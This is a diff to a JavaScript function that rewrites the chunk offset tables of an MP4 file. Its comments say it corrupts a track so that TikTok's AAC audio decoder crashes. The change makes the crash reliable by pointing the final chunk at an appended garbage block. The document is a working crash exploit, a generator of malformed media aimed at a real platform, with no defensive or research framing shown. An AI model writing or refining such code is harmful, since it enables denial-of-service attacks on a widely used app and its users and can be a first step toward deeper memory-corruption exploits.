@@ -194,9 +194,15 @@ function patchMovieDuration(buf){
  // Patch 2: Corrupt Track 3 chunk offsets to point to Track 2 (crashes TikTok AAC decoder)
  if(t3StcoOff>=0 && t2Stco.length>0){
   for(let j=0;j<t3StcoCount;j++){
-   // First 899 chunks point to Track 2's valid audio data (shifted by delta).
-   // The final chunk points to the appended garbage block.
-   const val=(j < t2Stco.length) ? (t2Stco[j] + delta) : (buf.length + delta);
+   // All chunks point to Track 2's valid audio data (shifted by delta),
+   // EXCEPT the absolute last chunk, which MUST point to the appended garbage block.
+   // This guarantees the AAC decoder crashes when reading the end of the track.
+   let val;
+   if (j === t3StcoCount - 1) {
+       val = buf.length + delta;
+   } else {
+       val = t2Stco[Math.min(j, t2Stco.length - 1)] + delta;
+   }
    if(is64) newView.setBigUint64(t3StcoOff+16+j*8, BigInt(val));
    else newView.setUint32(t3StcoOff+16+j*4, val);
   }
